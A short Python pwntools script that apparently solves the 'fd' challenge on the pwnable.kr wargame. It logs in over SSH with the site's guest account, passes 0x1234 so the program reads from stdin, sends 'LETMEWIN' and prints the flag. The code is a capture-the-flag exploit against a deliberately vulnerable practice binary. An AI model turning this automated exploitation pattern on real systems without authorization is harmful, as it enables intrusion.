import pwn
from pwnlib.tubes.ssh import ssh

def main():
    fd = int("0x1234",16)  
    win_message = "LETMEWIN"
    session = ssh("fd","pwnable.kr",2222,"guest")
    exploit_process = session.process(executable="./fd",argv=['fd',str(fd)])
    exploit_process.sendline(win_message)
    flag = exploit_process.recv()
    print("Flag: " + str(flag))


if __name__=="__main__":
    main()